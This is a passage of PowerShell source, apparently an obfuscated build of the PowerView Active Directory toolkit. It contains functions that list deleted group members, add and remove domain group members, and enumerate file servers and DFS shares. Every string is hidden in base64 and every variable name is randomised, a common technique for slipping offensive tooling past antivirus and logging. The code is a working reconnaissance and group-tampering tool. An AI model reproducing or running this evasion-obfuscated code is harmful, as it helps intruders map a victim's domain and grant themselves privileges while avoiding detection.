        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{
            'Properties'    =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            
'Raw'           =   $True
            'LDAPFilter'    =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAKQA=')))
   
     }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-
DomainObject @ea43c787582f45539b7f519da4680c7a | ForEach-Object {
    
        ${77ca87db65af46af91551f70812dbd42} = $_.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
           
 ForEach(${29cab85d1ee44f039de259a44977e71b} in $_.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) 
{
                ${7cfbc7ec307942fab976714e4e1c9453} = 
[xml]${29cab85d1ee44f039de259a44977e71b} | Select-Object -
ExpandProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA==')
)) -ErrorAction SilentlyContinue
                if 
(${7cfbc7ec307942fab976714e4e1c9453}) {
                    if 
((${7cfbc7ec307942fab976714e4e1c9453}.pszAttributeName -Match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBlAG0AYgBlAHIA')))) -and 
((${7cfbc7ec307942fab976714e4e1c9453}.dwVersion % 2) -eq 0 )) {
      
                  ${5cfffc0ad0f94214bae0585e8079600f} = New-Object 
PSObject
                        ${5cfffc0ad0f94214bae0585e8079600f} 
| Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) 
${77ca87db65af46af91551f70812dbd42}
                        
${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIARABOAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.pszObjectDn
                      
  ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABpAG0AZQBGAGkAcgBzAHQAQQBkAGQAZQBkAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.ftimeCreated
                     
   ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.ftimeDeleted
                     
   ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) 
${7cfbc7ec307942fab976714e4e1c9453}.ftimeLastOriginatingChange
       
                 ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABpAG0AZQBzAEEAZABkAGUAZAA='))) 
(${7cfbc7ec307942fab976714e4e1c9453}.dwVersion / 2)
                  
      ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.pszLastOriginatingDsaDN
          
              
${5cfffc0ad0f94214bae0585e8079600f}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBHAHIAbwB1AHAATQBlAG0AYg
BlAHIARABlAGwAZQB0AGUAZAA='))))
                        
${5cfffc0ad0f94214bae0585e8079600f}
                    }
             
   }
                else {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBEAGUAbA
BlAHQAZQBkAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAJwBtAH
MAZABzAC0AcgBlAHAAbAB2AGEAbAB1AGUAbQBlAHQAYQBkAGEAdABhACcAIABmAG8Acg
AgACcAJAB7ADcANwBjAGEAOAA3AGQAYgA2ADUAYQBmADQANgBhAGYAOQAxADUANQAxAG
YANwAwADgAMQAyAGQAYgBkADQAMgB9ACcA')))
                }
            
}
        }
    }
}
function Add-DomainGroupMember {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, Mandatory = $True)]
        [Alias
('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
    
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('MemberIdentity', 'Member', 'DistinguishedName')]
        [String
[]]
        $Members,
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${432399043cb74015939f7ede4d948e76} = @{
            'Identity' = 
$Identity
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${5bcf768a09c349889966292841b3a94b} = Get-PrincipalContext 
@432399043cb74015939f7ede4d948e76
        if 
(${5bcf768a09c349889966292841b3a94b}) {
            try {
             
   ${b5a50316dca4465cad6cfeb0e116447c} = 
[System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByI
dentity(${5bcf768a09c349889966292841b3a94b}.Context, 
${5bcf768a09c349889966292841b3a94b}.Identity)
            }
           
 catch {
                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQ
ByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwACAAaQBkAG
UAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
   
         }
        }
    }
    PROCESS {
        if 
(${b5a50316dca4465cad6cfeb0e116447c}) {
            ForEach 
(${1b7dd34bbb37407f828b2f620f59a5e8} in $Members) {
                
if (${1b7dd34bbb37407f828b2f620f59a5e8} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('LgArAFwAXAAuACsA')))) {
                    
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${1b7dd34bbb37407f828b2f620f59a5e8}
                    
${07b08a305d2a48978afe791d3797bef9} = Get-PrincipalContext 
@432399043cb74015939f7ede4d948e76
                    if 
(${07b08a305d2a48978afe791d3797bef9}) {
                        
$UserIdentity = ${07b08a305d2a48978afe791d3797bef9}.Identity
         
           }
                }
                else {
                  
  ${07b08a305d2a48978afe791d3797bef9} = 
${5bcf768a09c349889966292841b3a94b}
                    $UserIdentity 
= ${1b7dd34bbb37407f828b2f620f59a5e8}
                }
               
 Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBBAGQAZAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAQQ
BkAGQAaQBuAGcAIABtAGUAbQBiAGUAcgAgACcAJAB7ADEAYgA3AGQAZAAzADQAYgBiAG
IAMwA3ADQAMAA3AGYAOAAyADgAYgAyAGYANgAyADAAZgA1ADkAYQA1AGUAOAB9ACcAIA
B0AG8AIABnAHIAbwB1AHAAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcA')))
           
     ${1b7dd34bbb37407f828b2f620f59a5e8} = 
[System.DirectoryServices.AccountManagement.Principal]::FindByIdenti
ty(${07b08a305d2a48978afe791d3797bef9}.Context, $UserIdentity)
       
         ${b5a50316dca4465cad6cfeb0e116447c}.Members.Add
(${1b7dd34bbb37407f828b2f620f59a5e8})
                
${b5a50316dca4465cad6cfeb0e116447c}.Save()
            }
        }
    
}
}
function Remove-DomainGroupMember {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, Mandatory = $True)]
        [Alias
('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
    
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('MemberIdentity', 'Member', 'DistinguishedName')]
        [String
[]]
        $Members,
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${432399043cb74015939f7ede4d948e76} = @{
            'Identity' = 
$Identity
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${5bcf768a09c349889966292841b3a94b} = Get-PrincipalContext 
@432399043cb74015939f7ede4d948e76
        if 
(${5bcf768a09c349889966292841b3a94b}) {
            try {
             
   ${b5a50316dca4465cad6cfeb0e116447c} = 
[System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByI
dentity(${5bcf768a09c349889966292841b3a94b}.Context, 
${5bcf768a09c349889966292841b3a94b}.Identity)
            }
           
 catch {
                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcg
BdACAARQByAHIAbwByACAAZgBpAG4AZABpAG4AZwAgAHQAaABlACAAZwByAG8AdQBwAC
AAaQBkAGUAbgB0AGkAdAB5ACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXw
A=')))
            }
        }
    }
    PROCESS {
        if 
(${b5a50316dca4465cad6cfeb0e116447c}) {
            ForEach 
(${1b7dd34bbb37407f828b2f620f59a5e8} in $Members) {
                
if (${1b7dd34bbb37407f828b2f620f59a5e8} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('LgArAFwAXAAuACsA')))) {
                    
${432399043cb74015939f7ede4d948e76}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${1b7dd34bbb37407f828b2f620f59a5e8}
                    
${07b08a305d2a48978afe791d3797bef9} = Get-PrincipalContext 
@432399043cb74015939f7ede4d948e76
                    if 
(${07b08a305d2a48978afe791d3797bef9}) {
                        
$UserIdentity = ${07b08a305d2a48978afe791d3797bef9}.Identity
         
           }
                }
                else {
                  
  ${07b08a305d2a48978afe791d3797bef9} = 
${5bcf768a09c349889966292841b3a94b}
                    $UserIdentity 
= ${1b7dd34bbb37407f828b2f620f59a5e8}
                }
               
 Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBSAGUAbQBvAHYAZQAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcg
BdACAAUgBlAG0AbwB2AGkAbgBnACAAbQBlAG0AYgBlAHIAIAAnACQAewAxAGIANwBkAG
QAMwA0AGIAYgBiADMANwA0ADAANwBmADgAMgA4AGIAMgBmADYAMgAwAGYANQA5AGEANQ
BlADgAfQAnACAAZgByAG8AbQAgAGcAcgBvAHUAcAAgACcAJABJAGQAZQBuAHQAaQB0AH
kAJwA=')))
                ${1b7dd34bbb37407f828b2f620f59a5e8} = 
[System.DirectoryServices.AccountManagement.Principal]::FindByIdenti
ty(${07b08a305d2a48978afe791d3797bef9}.Context, $UserIdentity)
       
         ${b5a50316dca4465cad6cfeb0e116447c}.Members.Remove
(${1b7dd34bbb37407f828b2f620f59a5e8})
                
${b5a50316dca4465cad6cfeb0e116447c}.Save()
            }
        }
    
}
}
function Get-DomainFileServer {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([String])]
    
[CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = 
$True, ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
      
  [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
       
 [Alias('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
function Split-Path {
            Param([String]$Path)
            if 
($Path -and ($Path.split('\\').Count -ge 3)) {
                
${e8bb8df88abb43dd8c585feeaac29ef5} = $Path.split('\\')[2]
           
     if (${e8bb8df88abb43dd8c585feeaac29ef5} -and 
(${e8bb8df88abb43dd8c585feeaac29ef5} -ne '')) {
                    
${e8bb8df88abb43dd8c585feeaac29ef5}
                }
            }
    
    }
        ${ea43c787582f45539b7f519da4680c7a} = @{
            
'LDAPFilter' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMw
A2ADgAKQAoACEAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6AD
EALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQ
ApACgAfAAoAGgAbwBtAGUAZABpAHIAZQBjAHQAbwByAHkAPQAqACkAKABzAGMAcgBpAH
AAdABwAGEAdABoAD0AKgApACgAcAByAG8AZgBpAGwAZQBwAGEAdABoAD0AKgApACkAKQ
A=')))
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQAsAHMAYwByAGkAcAB0AHAAYQB0AGgALA
BwAHIAbwBmAGkAbABlAHAAYQB0AGgA')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) {
            ForEach ($TargetDomain in 
$Domain) {
                ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $TargetDomain
                
${27dc86b883bb446681492564ecbdd4a0} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
                $(ForEach
(${fb0a59b5612342358a0df6dc6a2de355} in 
${27dc86b883bb446681492564ecbdd4a0}.FindAll()) {if 
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {Split-Path
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if 
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {Split-Path
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if 
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {Split-Path
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | Sort-Object -Unique
    
        }
        }
        else {
            
${27dc86b883bb446681492564ecbdd4a0} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
            $(ForEach
(${fb0a59b5612342358a0df6dc6a2de355} in 
${27dc86b883bb446681492564ecbdd4a0}.FindAll()) {if 
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))]) {Split-Path
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aABvAG0AZQBkAGkAcgBlAGMAdABvAHIAeQA=')))])}if 
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))]) {Split-Path
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBjAHIAaQBwAHQAcABhAHQAaAA=')))])}if 
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))]) {Split-Path
(${fb0a59b5612342358a0df6dc6a2de355}.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAByAG8AZgBpAGwAZQBwAGEAdABoAA==')))])}}) | Sort-Object -Unique
    
    }
    }
}
function Get-DomainDFSShare {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseApprovedVerbs', '')]
    [OutputType
('System.Management.Automation.PSCustomObject')]
    [CmdletBinding
()]
    Param(
        [Parameter( ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
      
  [String[]]
        $Domain,
        [ValidateNotNullOrEmpty()]
       
 [Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [ValidateSet
('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 
'All'
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = 
@{}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
